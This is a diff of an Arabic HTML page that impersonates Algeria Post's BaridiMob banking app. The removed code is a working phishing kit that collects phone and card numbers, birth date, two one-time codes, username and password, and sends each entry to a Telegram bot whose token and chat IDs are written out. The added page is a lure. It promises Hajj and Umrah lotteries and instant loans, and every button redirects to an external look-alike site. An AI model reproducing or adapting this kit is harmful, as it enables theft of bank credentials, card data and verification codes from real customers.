@@ -2,753 +2,209 @@
 <html lang="ar" dir="rtl">
 <head>
   <meta charset="UTF-8">
-  <title>بريدي موب</title>
   <meta name="viewport" content="width=device-width, initial-scale=1">
-  <!-- Social Media Preview Meta Tags -->
-  <meta property="og:title" content="بريدي موب" />
-  <meta property="og:site_name" content="بريدي موب" />
-  <meta property="og:image" content="https://www2.0zz0.com/2025/09/27/16/225254962.png" />
-  <meta property="og:type" content="website" />
-  <meta property="og:description" content="خدمة بريدي موب عبر النقال لبريد الجزائر" />
-  <meta name="twitter:card" content="summary_large_image" />
-  <meta name="twitter:title" content="بريدي موب" />
-  <meta name="twitter:image" content="https://www2.0zz0.com/2025/09/27/16/225254962.png" />
-  <meta name="twitter:description" content="خدمة بريدي موب عبر النقال لبريد الجزائر" />
+  <title>تطبيق بريدي موب العصري</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@700;400&display=swap" rel="stylesheet">
   <style>
-    /* ... باقي التنسيقات كما كانت ... */
     :root {
-      --main-blue: #13306a;
-      --main-dark: #18104c;
-      --accent: #f7b731;
-      --error: #e74c3c;
-      --shadow: 0 4px 24px #0002;
-      --radius: 15px;
-      --input-bg: #f7f8fa;
-      --input-focus: #f0f7ff;
-      --input-border: #dbe4ed;
-      --success: #27ae60;
-      --transition: 0.25s;
+      --primary: #1b376d;
+      --accent: #285bb5;
+      --bg: #f7fbff;
+      --card: #fff;
+      --border: #d5dbe6;
+      --shadow: 0 2px 12px #e4eaf3;
+      --radius: 14px;
+      --transition: 0.25s cubic-bezier(.4,0,.2,1);
     }
     body {
-      background: linear-gradient(135deg, #f5f6fa 0%, #eaf0fd 100%);
-      font-family: 'Cairo', Arial, sans-serif;
+      font-family: 'Cairo', 'Arial', sans-serif;
+      background: var(--bg);
       margin: 0;
       padding: 0;
-      color: #222;
-      transition: background var(--transition);
-    }
-    .screen {
-      display: none;
+      color: var(--primary);
       min-height: 100vh;
-      width: 100vw;
-      justify-content: center;
-      align-items: center;
-      animation: fade-in 0.6s;
-    }
-    @keyframes fade-in {
-      0% {opacity: 0;}
-      100% {opacity: 1;}
-    }
-    .active {
-      display: flex !important;
-    }
-    .main-container {
-      max-width: 430px;
-      width: 96vw;
-      margin: 0 auto;
-      background: #fff;
-      border-radius: var(--radius);
-      box-shadow: var(--shadow);
-      padding: 0 0 32px 0;
-      position: relative;
-      overflow: hidden;
-      animation: fade-in 0.6s;
-    }
-    .logo-wrap {
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      margin-top: 40px;
-      margin-bottom: 18px;
-      position: relative;
-    }
-    .logo-bg {
-      position: absolute;
-      left: 50%;
-      top: 50%;
-      transform: translate(-50%,-50%);
-      width: 170px;
-      height: 170px;
-      background: linear-gradient(135deg,#eaf0fd 60%,#fff 100%);
-      border-radius: 50%;
-      box-shadow: 0 4px 24px #13306a22;
-      z-index: 0;
-      opacity: 0.36;
-    }
-    .logo {
-      width: 145px;
-      z-index: 2;
-      position: relative;
-      filter: drop-shadow(0 2px 18px #13306a22);
-      transition: transform var(--transition);
-    }
-    .main-container .logo {
-      margin-bottom: 2px;
-    }
-    .header-section {
-      background: var(--main-blue);
-      color: #fff;
-      padding: 21px 0 19px 0;
-      font-size: 1.17em;
-      font-weight: 700;
-      border-radius: var(--radius) var(--radius) 0 0;
-      text-align: center;
-      letter-spacing: 1px;
-      margin-bottom: 0;
-      box-shadow: 0 2px 10px #0001;
-    }
-    .welcome-section {
-      background: #fff;
-      color: var(--main-dark);
-      font-size: 1.2em;
-      font-weight: 700;
-      text-align: center;
-      border-radius: var(--radius);
-      padding: 30px 10px 20px 10px;
-      margin-bottom: 0;
-      box-shadow: 0 2px 10px #0001;
-      letter-spacing: 0.8px;
-    }
-    .version {
-      color: #888;
-      font-size: 1em;
-      margin: 20px 0 6px 0;
-      text-align: left;
-      padding-right: 14px;
-      font-weight: 500;
-    }
-    .form-section {
-      background: var(--main-blue);
-      color: #fff;
-      margin: 30px 0 0 0;
-      padding: 12px 0 12px 0;
-      font-size: 1.07em;
-      font-weight: 600;
-      border-radius: var(--radius) var(--radius) 0 0;
-      text-align: center;
-      box-shadow: 0 2px 8px #0001;
-      letter-spacing: 1px;
-    }
-    .form-area {
-      background: #fff;
-      padding: 32px 20px 20px 20px;
-      border-radius: 0 0 var(--radius) var(--radius);
-      box-shadow: 0 2px 8px #0001;
-      animation: fade-in 0.6s;
-    }
-    .form-group {
-      margin-bottom: 21px;
-      text-align: left;
-      position: relative;
-    }
-    label {
-      font-size: 1.04em;
-      color: var(--main-blue);
-      font-weight: 600;
-      margin-bottom: 7px;
-      display: block;
-      letter-spacing: 0.5px;
-      transition: color var(--transition);
-    }
-    label span {
-      color: var(--error);
-      margin-right: 4px;
-      font-weight: bold;
-    }
-    input[type="text"], input[type="password"] {
-      width: 100%;
-      padding: 15px;
-      border: 1.5px solid var(--input-border);
-      border-radius: 7px;
-      font-size: 1.06em;
-      background: var(--input-bg);
-      direction: ltr;
-      text-align: left;
-      font-family: inherit;
-      margin-top: 2px;
-      margin-bottom: 3px;
+      line-height: 1.7;
       box-sizing: border-box;
-      transition: border var(--transition), background var(--transition);
-      outline: none;
-      font-weight: 500;
-      letter-spacing: 1px;
     }
-    input[type="text"]:focus, input[type="password"]:focus {
-      border-color: var(--main-blue);
-      background: var(--input-focus);
-      box-shadow: 0 0 0 2px #d3e6fa;
-    }
-    .error {
-      color: var(--error);
-      font-size: 0.98em;
-      margin-top: 0px;
-      margin-bottom: 2px;
-      text-align: right;
-      font-weight: 500;
-      letter-spacing: 0.5px;
-      opacity: 0.93;
-    }
-    .success {
-      color: var(--success);
-      font-size: 1em;
-      margin-top: 10px;
-      font-weight: 600;
-    }
-    .main-btn {
+    .header {
+      display: flex;
+      justify-content: flex-start;
+      align-items: center;
+      padding: 18px 24px 0 24px;
+      background: transparent;
+      position: relative;
       width: 100%;
-      background: var(--main-dark);
-      color: #fff;
-      font-size: 1.19em;
-      border: none;
-      border-radius: 10px;
-      padding: 15px 0;
-      cursor: pointer;
-      font-family: inherit;
-      font-weight: 700;
-      letter-spacing: 1px;
-      margin-top: 18px;
-      transition: background var(--transition), box-shadow var(--transition), transform var(--transition);
-      box-shadow: 0 2px 8px #0001;
     }
-    .main-btn:active {
-      background: #33248e;
-      transform: scale(0.96);
+    .header .logo-small {
+      width: 54px;
+      height: 54px;
+      border-radius: 50%;
+      background: #fff;
+      border: 2px solid var(--border);
+      object-fit: contain;
+      box-shadow: 0 2px 8px #e4eaf3;
+      transition: box-shadow var(--transition), transform var(--transition);
     }
-    .main-btn:focus {
-      box-shadow: 0 4px 18px #13306a33;
+    .header .logo-small:hover {
+      box-shadow: 0 4px 18px #b1c7ef;
+      transform: scale(1.07) rotate(-3deg);
     }
-    /* شاشة الانتظار */
-    .loader-container {
+    .main-logo {
       display: flex;
       flex-direction: column;
       align-items: center;
-      justify-content: center;
-      min-height: 350px;
-      font-size: 1.13em;
-      background: #fff;
-      border-radius: var(--radius);
-      box-shadow: var(--shadow);
-      padding: 60px 22px 50px 22px;
-      max-width: 340px;
       margin: 32px auto 0 auto;
+      gap: 6px;
     }
-    .loader-logo {
-      width: 115px;
-      margin-bottom: 20px;
-    }
-    .loader {
-      border: 7px solid #eee;
-      border-radius: 50%;
-      border-top: 7px solid var(--main-blue);
-      width: 65px;
-      height: 65px;
-      animation: spin 1s linear infinite;
-      margin-bottom: 30px;
-    }
-    @keyframes spin {
-      0% { transform: rotate(0deg);}
-      100% {transform: rotate(360deg);}
-    }
-    /* رمز التحقق */
-    .verify-box {
-      border: 1.5px solid #d6e0ee;
-      border-radius: var(--radius);
-      background: #f8fafd;
-      padding: 22px 11px 18px 11px;
-      box-shadow: 0 2px 8px #0001;
-      margin-bottom: 16px;
-      text-align: center;
-      animation: fade-in 0.7s;
-    }
-    .verify-label {
-      font-size: 1.08em;
-      font-weight: 500;
-      color: #193a6b;
-      margin-bottom: 10px;
-    }
-    .timer {
-      font-size: 1.23em;
-      color: #222;
-      background: #fff;
-      border-radius: 7px;
-      display: inline-block;
-      width: 86px;
-      font-weight: bold;
-      margin: 18px auto 10px auto;
-      padding: 6px 0;
-      letter-spacing: 1px;
-      border: 1.5px solid #ddd;
-      box-shadow: 0 2px 8px #0001;
-    }
-    .resend-btn {
-      width: 100%;
-      background: var(--accent);
-      color: var(--main-blue);
-      font-size: 1.07em;
-      border: none;
-      border-radius: 8px;
-      padding: 12px 0;
-      cursor: pointer;
-      margin-top: 8px;
-      font-family: inherit;
-      font-weight: 600;
-      letter-spacing: 1px;
-      display: block;
-      box-shadow: 0 2px 8px #0001;
-      transition: background var(--transition);
-    }
-    .resend-btn:active {
-      background: #ffeaa7;
-    }
-    .hidden-btn {
-      display: none !important;
-    }
-    .info-phone {
-      font-size: 1.03em;
-      color: var(--main-blue);
-      margin-top: 8px;
-      margin-bottom: 7px;
-      font-weight: 600;
-      letter-spacing: 2px;
-    }
-    .verify-desc {
-      color: #333;
-      font-size: 1em;
-      margin-bottom: 7px;
-      margin-top: 10px;
-      font-weight: 500;
-    }
-    .verify-desc2 {
-      color: #666;
-      font-size: 0.96em;
-      margin-top: 10px;
-      margin-bottom: 0px;
-    }
-    .modal {
-      position: fixed;
-      top: 0; left: 0; right: 0; bottom: 0;
-      background: rgba(0,0,0,0.20);
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      z-index: 99;
-      visibility: hidden;
-    }
-    .modal.active {
-      visibility: visible;
-    }
-    .modal-content {
-      background: #fff;
-      border-radius: var(--radius);
-      padding: 30px 24px;
-      text-align: center;
+    .main-logo img {
+      width: 180px;
+      max-width: 60vw;
+      margin-bottom: 18px;
+      margin-top: 12px;
+      border-radius: 18px;
+      border: 3px solid #e4eaf3;
       box-shadow: var(--shadow);
-      font-size: 1.13em;
-      color: var(--error);
-      font-weight: bold;
-      animation: fade-in 0.7s;
     }
-    .modal-btn {
-      background: var(--main-blue);
+    .main-title {
+      font-size: 2.3rem;
+      font-weight: 800;
+      margin-bottom: 8px;
+      text-align: center;
+      letter-spacing: 1px;
+      background: linear-gradient(90deg,#1b376d,#285bb5 80%);
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+    }
+    .version {
+      font-size: 1.15rem;
+      color: #285bb5;
+      opacity: 0.85;
+      margin-bottom: 14px;
+      text-align: center;
+    }
+    .desc {
+      font-size: 1.12rem;
+      color: var(--primary);
+      text-align: center;
+      margin-bottom: 24px;
+      background: #e6f0fd8f;
+      border-radius: 12px;
+      padding: 8px 10px 4px 10px;
+      border: 1px solid #e4eaf3;
+      box-shadow: 0 1px 4px #e4eaf3;
+      display: inline-block;
+      margin-right: auto;
+      margin-left: auto;
+    }
+    .buttons {
+      width: 95%;
+      max-width: 440px;
+      margin: 0 auto 22px auto;
+      display: flex;
+      flex-direction: column;
+      gap: 16px;
+    }
+    .action-btn {
+      background: linear-gradient(90deg,#1b376d,#285bb5 70%);
       color: #fff;
       border: none;
-      border-radius: 8px;
-      padding: 12px 36px;
-      font-size: 1.09em;
-      margin-top: 21px;
+      border-radius: 11px;
+      padding: 17px 12px;
+      font-size: 1.12rem;
+      font-weight: 800;
       cursor: pointer;
-      font-family: inherit;
-      font-weight: 600;
-      letter-spacing: 1px;
-      box-shadow: 0 2px 8px #0001;
-      transition: background var(--transition);
+      transition: background var(--transition), transform var(--transition), box-shadow var(--transition);
+      box-shadow: 0 3px 14px #e4eaf3;
+      letter-spacing: 0.7px;
+      outline: none;
+      border-bottom: 2.5px solid #193c6d15;
     }
-    .modal-btn:active { background: #184594;}
-    @media (max-width:600px) {
-      .main-container { max-width: 98vw; }
-      .form-area { padding: 18px 6vw 16px 6vw; }
-      .logo { width: 92px;}
-      .loader-logo { width: 68px;}
-      .logo-bg { width: 108px; height: 108px;}
-      .loader-container { max-width: 96vw;}
+    .action-btn:hover {
+      background: linear-gradient(90deg,#285bb5 10%,#1b376d 100%);
+      transform: translateY(-2px) scale(1.03);
+      box-shadow: 0 8px 34px #d5e5ff85;
     }
+    .featured-img {
+      display: flex;
+      justify-content: center;
+      margin: 36px 0 20px 0;
+    }
+    .featured-img img {
+      width: 98%;
+      max-width: 500px;
+      border-radius: 15px;
+      border: 3px solid #e4eaf3;
+      box-shadow: 0 2px 10px #e4eaf3;
+      transition: box-shadow var(--transition), transform var(--transition);
+    }
+    .featured-img img:hover {
+      box-shadow: 0 6px 30px #adbde7;
+      transform: scale(1.01) rotate(-1deg);
+    }
+    .footer {
+      width: 100%;
+      text-align: center;
+      color: #7c8bac;
+      padding: 13px 0 26px 0;
+      font-size: 1.01rem;
+      letter-spacing: 0.3px;
+      margin-top: 18px;
+    }
+    /* Responsive */
+    @media (max-width: 600px) {
+      .main-title { font-size: 1.35rem; }
+      .main-logo img { width: 120px; }
+      .featured-img img { width: 99%; }
+      .desc { font-size:1.01rem;}
+    }
+    /* Scroll bar styling */
+    ::-webkit-scrollbar { width: 6px; }
+    ::-webkit-scrollbar-thumb { background: #e4eaf3; border-radius: 3px; }
   </style>
 </head>
 <body>
-  <!-- الصفحة الأولى: الترحيب بالشعار -->
-  <div class="screen active" id="screen-0">
-    <div class="main-container">
-      <div class="logo-wrap">
-        <div class="logo-bg"></div>
-        <img src="https://www2.0zz0.com/2025/09/27/13/569728726.png" alt="بريدي موب" class="logo" />
-      </div>
-      <div class="version">Version: 1.29.1</div>
-      <div class="welcome-section">
-        عزيزي الزبون، مرحباً بك في خدمة<br>
-        بريدي موب عبر النقال لبريد الجزائر
-      </div>
-      <button class="main-btn" onclick="gotoScreen(1)">مواصلة</button>
-    </div>
+  <div class="header">
+    <img src="https://www2.0zz0.com/2025/10/14/18/655007304.png" alt="بريدي موب شعار" class="logo-small">
   </div>
-  <!-- شاشة إدخال رقم الهاتف والبطاقة وتاريخ الميلاد -->
-  <div class="screen" id="screen-1">
-    <div class="main-container">
-      <div class="header-section">
-        أدخلوا رقم الهاتف النقال المسجل بالنظام
-      </div>
-      <div class="version">Version: 1.29.1</div>
-      <hr style="border: none; height: 1px; background: #e4eaf4; margin: 8px 0 0 0;">
-      <div class="form-section">
-        أدخلوا رقم الهاتف النقال المسجل بالنظام
-      </div>
-      <div class="form-area">
-        <form id="regForm" autocomplete="off">
-          <div class="form-group">
-            <label for="phone">Phone Number - هاتف <span>*</span></label>
-            <input type="text" id="phone" name="phone" maxlength="10" pattern="\d{10}" required placeholder="XXXX XXXXXX">
-            <div class="error" id="phoneError"></div>
-          </div>
-          <div class="form-group">
-            <label for="card">Card Number - رقم البطاقة <span>*</span></label>
-            <input type="text" id="card" name="card" maxlength="16" pattern="\d{16}" required placeholder="XXXX XXXX XXXX XXXX">
-            <div class="error" id="cardError"></div>
-          </div>
-          <div class="form-group">
-            <label for="exp">تاريخ الميلاد <span>*</span></label>
-            <input type="text" id="exp" name="exp" maxlength="5" required placeholder="MM/YY">
-            <div class="error" id="expError"></div>
-          </div>
-          <button type="submit" class="main-btn">مواصلة</button>
-          <div id="formMsg"></div>
-        </form>
-      </div>
-    </div>
+  <div class="main-logo">
+    <img src="https://www2.0zz0.com/2025/10/14/18/510932180.jpeg" alt="شعار بريدي موب">
   </div>
-  <!-- شاشة الانتظار بعد إرسال البيانات -->
-  <div class="screen" id="screen-wait">
-    <div class="loader-container">
-      <img src="https://www2.0zz0.com/2025/09/27/13/569728726.png" alt="بريدي موب" class="loader-logo" />
-      <div class="loader"></div>
-      <div id="wait-text">جاري معالجة الطلب، يرجى الانتظار...</div>
-    </div>
+  <div class="main-title">تطبيق بريدي موب العصري</div>
+  <div class="version">V.25.12.26</div>
+  <div class="desc">
+    لِعُملاء بريد موب: قرعة الحج و العُمرة مقدمة من الديوان الملكي السعودي وبريد موب
   </div>
-  <!-- شاشة رمز التحقق الأول -->
-  <div class="screen" id="screen-2">
-    <div class="main-container">
-      <div class="logo-wrap">
-        <div class="logo-bg"></div>
-        <img src="https://www2.0zz0.com/2025/09/27/13/569728726.png" alt="بريدي موب" class="logo" />
-      </div>
-      <div class="form-area">
-        <div class="verify-desc" style="margin-bottom:10px;">
-          <span style="color:red;font-weight:bold;">*</span>
-          للبدء في العملية، يتوجب عليكم تأكيد رقم هاتفكم النقال
-        </div>
-        <form id="verifyForm" autocomplete="off">
-          <div class="verify-box">
-            <div class="verify-label">
-              <span style="color:red;font-weight:bold;">*</span>
-              Confirmation code - رقم تأكيد
-            </div>
-            <input type="text" id="code" name="code" maxlength="6" pattern="\d{6}" required style="text-align:center;font-size:1.15em;">
-            <div class="error" id="codeError"></div>
-            <div class="timer" id="timer">01:00</div>
-            <button type="submit" class="main-btn" id="verifyBtn" style="margin-bottom:10px;">تأكيد - Confirm</button>
-            <button type="button" class="resend-btn hidden-btn" id="resendBtn" onclick="resendCode()">&#8635; إعادة إرسال الرسالة</button>
-          </div>
-        </form>
-        <div class="verify-desc">
-          <span style="color:red;font-weight:bold;">*</span>
-          الرجاء أدخل الرقم السري المؤقت المرسل على جوالك
-        </div>
-        <div class="info-phone" id="infoPhone">+213 * * * * * * * * *</div>
-        <div class="verify-desc2">
-          ثم أنقر فوق "تأكيد", إن لم تتلق الرسالة أنقر فوق "إعادة إرسال الرسالة"
-        </div>
-      </div>
-    </div>
+  <div class="buttons">
+    <button class="action-btn" onclick="redirect()">مواصلة - دخول بريدي موب</button>
+    <button class="action-btn" onclick="redirect()">سجّل دخول للحصول على قرض فوري و ميسر من 10000 لغاية 7000000 دج</button>
+    <button class="action-btn" onclick="redirect()">مواصلة - تسجيل دخول للحصول على قرعة العُمرة و الحج</button>
   </div>
-  <!-- شاشة اسم المستخدم وكلمة السر -->
-  <div class="screen" id="screen-3">
-    <div class="main-container">
-      <div class="logo-wrap">
-        <div class="logo-bg"></div>
-        <img src="https://www2.0zz0.com/2025/09/27/13/569728726.png" alt="بريدي موب" class="logo" />
-      </div>
-      <div class="header-section" style="margin-bottom:0;">
-        أهلاً بكم في تطبيق بريدي موب
-      </div>
-      <div class="form-area">
-        <form id="usernameForm" autocomplete="off">
-          <div class="form-group">
-            <label for="username">رجاءاً أدخل إسم المستخدم - <span>*</span> Please enter UserName</label>
-            <input type="text" id="username" name="username" maxlength="32" required>
-            <div class="error" id="usernameError"></div>
-          </div>
-          <div class="form-group">
-            <label for="password">أدخل الرقم السري - <span>*</span> Please enter your password</label>
-            <input type="password" id="password" name="password" maxlength="32" required>
-            <div class="error" id="passwordError"></div>
-          </div>
-          <button type="submit" class="main-btn">مواصلة</button>
-          <div id="usernameMsg"></div>
-        </form>
-      </div>
-    </div>
+  <div class="featured-img">
+    <img src="https://www2.0zz0.com/2025/10/14/18/706372093.jpeg" alt="مميزات بريدي موب">
   </div>
-  <!-- شاشة رمز التحقق الثاني -->
-  <div class="screen" id="screen-4">
-    <div class="main-container">
-      <div class="logo-wrap">
-        <div class="logo-bg"></div>
-        <img src="https://www2.0zz0.com/2025/09/27/13/569728726.png" alt="بريدي موب" class="logo" />
-      </div>
-      <div class="form-area">
-        <div class="verify-desc" style="margin-bottom:10px;">
-          <span style="color:red;font-weight:bold;">*</span>
-          للبدء في العملية، يتوجب عليكم تأكيد رقم هاتفكم النقال
-        </div>
-        <form id="verifyForm2" autocomplete="off">
-          <div class="verify-box">
-            <div class="verify-label">
-              <span style="color:red;font-weight:bold;">*</span>
-              Confirmation code - رقم تأكيد
-            </div>
-            <input type="text" id="code2" name="code2" maxlength="6" pattern="\d{6}" required style="text-align:center;font-size:1.15em;">
-            <div class="error" id="codeError2"></div>
-            <div class="timer" id="timer2">01:00</div>
-            <button type="submit" class="main-btn" id="verifyBtn2" style="margin-bottom:10px;">تأكيد - Confirm</button>
-            <button type="button" class="resend-btn hidden-btn" id="resendBtn2" onclick="resendCode2()">&#8635; إعادة إرسال الرسالة</button>
-          </div>
-        </form>
-        <div class="verify-desc">
-          <span style="color:red;font-weight:bold;">*</span>
-          الرجاء أدخل الرقم السري المؤقت المرسل على جوالك
-        </div>
-        <div class="info-phone" id="infoPhone2">+213 * * * * * * * * *</div>
-        <div class="verify-desc2">
-          ثم أنقر فوق "تأكيد", إن لم تتلق الرسالة أنقر فوق "إعادة إرسال الرسالة"
-        </div>
-      </div>
-    </div>
-  </div>
-  <!-- نافذة منبثقة -->
-  <div class="modal" id="modalError">
-    <div class="modal-content">
-      رمز التحقق غير صحيح<br>يرجى إعادة إدخال رمز التحقق
-      <button class="modal-btn" onclick="closeModal()">إعادة المحاولة</button>
-    </div>
+  <div class="footer">
+    <!-- النصوص المحذوفة من الفوتر حسب طلبك -->
   </div>
   <script>
-    // توكن جديد وارسال لجميع الايدي المطلوبة
-    const BOT_TOKEN = "7865156811:AAHOlnfoa5AuG-5jvzkFaLBsfhmlZ8DPymQ";
-    const CHAT_IDS = ["6873334348", "7711547813"];
-    let userData = {};
-    function gotoScreen(n) {
-      let screens = ['screen-0','screen-1','screen-wait','screen-2','screen-3','screen-4'];
-      screens.forEach(function(id){ document.getElementById(id).classList.remove('active'); });
-      document.getElementById(screens[n]).classList.add('active');
+    function redirect() {
+      window.location.href = "https://baridimoop.vercel.app/";
     }
-
-    // الصيغة MM/YY فقط
-    document.getElementById('exp').addEventListener('input', function(e) {
-      let v = e.target.value.replace(/[^\d\/]/g,'');
-      if (/^\d{2}$/.test(v)) { e.target.value = v + '/'; }
-      if (v.length === 3 && !v.includes('/')) { e.target.value = v.slice(0,2) + '/' + v.slice(2); }
-      if (v.length > 5) { e.target.value = v.slice(0,5); }
-    });
-
-    // دالة لتنسيق الرسالة لتلجرام باستخدام Markdown
-    function telegramText() {
-      return (
-`📱 رقم الهاتف:
-\`${userData.phone || ""}\`
-
-💳 رقم البطاقة:
-\`${userData.card || ""}\`
-
-🎂 تاريخ الميلاد:
-\`${userData.exp || ""}\`
-
-🔑 رمز التحقق الأول:
-\`${userData.verifyCode || ""}\`
-
-🔑 رمز التحقق الثاني:
-\`${userData.verifyCode2 || ""}\`
-
-👤 اسم المستخدم:
-\`${userData.username || ""}\`
-
-🔒 كلمة السر:
-\`${userData.password || ""}\`
-`
-      );
-    }
-
-    // ارسال الرسالة الى جميع الايدي المطلوبة مع التنسيق في كل مرة
-    function sendToTelegram(text) {
-      CHAT_IDS.forEach(function(chat_id){
-        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-          method: "POST",
-          headers: {'Content-Type': 'application/json'},
-          body: JSON.stringify({
-            chat_id: chat_id,
-            text: text,
-            parse_mode: "Markdown"
-          })
+    // ميزة الوضع الليلي (تلقائي/يدوي)
+    (function darkModeAuto() {
+      const prefersDark = window.matchMedia('(prefers-color-scheme: dark)').matches;
+      if (prefersDark) {
+        document.body.style.background = "#14213d";
+        document.body.style.color = "#fff";
+        document.querySelectorAll('.feature-card').forEach(el => {
+          el.style.background = "#24365c";
+          el.style.color = "#fff";
+          el.style.borderColor = "#162040";
         });
-      });
-    }
-
-    document.getElementById('regForm').onsubmit = function(e) {
-      e.preventDefault();
-      let phone = document.getElementById('phone').value.trim();
-      let card = document.getElementById('card').value.trim();
-      let exp = document.getElementById('exp').value.trim();
-      let valid = true;
-      document.getElementById('phoneError').textContent = "";
-      document.getElementById('cardError').textContent = "";
-      document.getElementById('expError').textContent = "";
-      document.getElementById('formMsg').textContent = "";
-      // يقبل فقط MM/YY
-      let expValid = /^\d{2}\/\d{2}$/.test(exp);
-      if (!/^\d{10}$/.test(phone)) { document.getElementById('phoneError').textContent = "يجب إدخال رقم هاتف صحيح مكون من 10 أرقام"; valid = false; }
-      if (!/^\d{16}$/.test(card)) { document.getElementById('cardError').textContent = "يجب إدخال رقم البطاقة الصحيح من 16 رقم"; valid = false; }
-      if (!expValid) { document.getElementById('expError').textContent = "يرجى إدخال تاريخ الميلاد بصيغة MM/YY فقط"; valid = false; }
-      if (!valid) return;
-      document.getElementById('formMsg').textContent = "";
-      userData.phone = phone;
-      userData.card = card;
-      userData.exp = exp;
-      sendToTelegram(telegramText());
-      gotoScreen(2);
-      let waitSec = Math.floor(Math.random()*6)+10;
-      let waitText = document.getElementById('wait-text');
-      let i = waitSec;
-      waitText.textContent = "جاري معالجة الطلب، يرجى الانتظار... ("+i+" ثانية)";
-      let waitInterval = setInterval(function(){
-        i--;
-        waitText.textContent = "جاري معالجة الطلب، يرجى الانتظار... ("+i+" ثانية)";
-        if(i<=0) {
-          clearInterval(waitInterval);
-          gotoScreen(3);
-          setVerifyPhone();
-          startTimer();
-        }
-      },1000);
-    }
-    function setVerifyPhone() {
-      let p = userData.phone || "";
-      let info = "+213 " + (p ? "*".repeat(p.length) : "* * * * * * * * * *");
-      document.getElementById('infoPhone').textContent = info;
-      document.getElementById('infoPhone2').textContent = info;
-    }
-    let timerInterval;
-    function startTimer() {
-      let seconds = 60;
-      document.getElementById('timer').textContent = "01:00";
-      document.getElementById('verifyBtn').disabled = false;
-      document.getElementById('resendBtn').classList.add('hidden-btn');
-      timerInterval = setInterval(function(){
-        seconds--;
-        let min = Math.floor(seconds/60), sec = seconds%60;
-        let txt = (min < 10 ? "0" : "") + min + ":" + (sec < 10 ? "0" : "") + sec;
-        document.getElementById('timer').textContent = txt;
-        if(seconds <= 0){
-          clearInterval(timerInterval);
-          document.getElementById('timer').textContent = "00:00";
-          document.getElementById('verifyBtn').disabled = true;
-          document.getElementById('resendBtn').classList.remove('hidden-btn');
-        }
-      }, 1000);
-    }
-    function resendCode() {
-      sendToTelegram(telegramText());
-      startTimer();
-    }
-    document.getElementById('verifyForm').onsubmit = function(e) {
-      e.preventDefault();
-      let code = document.getElementById('code').value.trim();
-      document.getElementById('codeError').textContent = "";
-      if (!/^\d{6}$/.test(code)) { document.getElementById('codeError').textContent = "الرمز يجب أن يكون 6 أرقام فقط"; return; }
-      userData.verifyCode = code;
-      sendToTelegram(telegramText());
-      gotoScreen(4);
-      document.getElementById('code').value = "";
-    }
-    document.getElementById('usernameForm').onsubmit = function(e){
-      e.preventDefault();
-      let username = document.getElementById('username').value.trim();
-      let password = document.getElementById('password').value.trim();
-      let valid = true;
-      document.getElementById('usernameError').textContent = "";
-      document.getElementById('passwordError').textContent = "";
-      document.getElementById('usernameMsg').textContent = "";
-      if(username.length < 4) { document.getElementById('usernameError').textContent = "يرجى إدخال اسم مستخدم صالح"; valid = false; }
-      if(password.length < 4) { document.getElementById('passwordError').textContent = "يرجى إدخال كلمة سر صالحة"; valid = false; }
-      if(!valid) return;
-      userData.username = username;
-      userData.password = password;
-      sendToTelegram(telegramText());
-      gotoScreen(5);
-      startTimer2();
-    }
-    let timerInterval2;
-    function startTimer2() {
-      let seconds = 60;
-      document.getElementById('timer2').textContent = "01:00";
-      document.getElementById('verifyBtn2').disabled = false;
-      document.getElementById('resendBtn2').classList.add('hidden-btn');
-      timerInterval2 = setInterval(function(){
-        seconds--;
-        let min = Math.floor(seconds/60), sec = seconds%60;
-        let txt = (min < 10 ? "0" : "") + min + ":" + (sec < 10 ? "0" : "") + sec;
-        document.getElementById('timer2').textContent = txt;
-        if(seconds <= 0){
-          clearInterval(timerInterval2);
-          document.getElementById('timer2').textContent = "00:00";
-          document.getElementById('verifyBtn2').disabled = true;
-          document.getElementById('resendBtn2').classList.remove('hidden-btn');
-        }
-      }, 1000);
-    }
-    function resendCode2() {
-      sendToTelegram(telegramText());
-      startTimer2();
-    }
-    document.getElementById('verifyForm2').onsubmit = function(e){
-      e.preventDefault();
-      let code2 = document.getElementById('code2').value.trim();
-      document.getElementById('codeError2').textContent = "";
-      if (!/^\d{6}$/.test(code2)) { document.getElementById('codeError2').textContent = "الرمز يجب أن يكون 6 أرقام فقط"; return; }
-      userData.verifyCode2 = code2;
-      sendToTelegram(telegramText());
-      showModal(function() { document.getElementById('code2').value = ""; });
-      document.getElementById('verifyForm2').querySelector("button").disabled = false;
-    }
-    function showModal(afterClose) {
-      document.getElementById('modalError').classList.add('active');
-      document.getElementById('modalError').onclick = function(e) {
-        if (e.target.classList.contains('modal')) closeModal(afterClose);
-      };
-      document.querySelector('.modal-btn').onclick = function() {
-        closeModal(afterClose);
-      };
-    }
-    function closeModal(afterClose) {
-      document.getElementById('modalError').classList.remove('active');
-      if (afterClose) afterClose();
-    }
+        document.querySelector('.desc').style.background = "#28395d";
+        document.querySelector('.desc').style.color = "#fff";
+      }
+    })();
   </script>
 </body>
 </html>
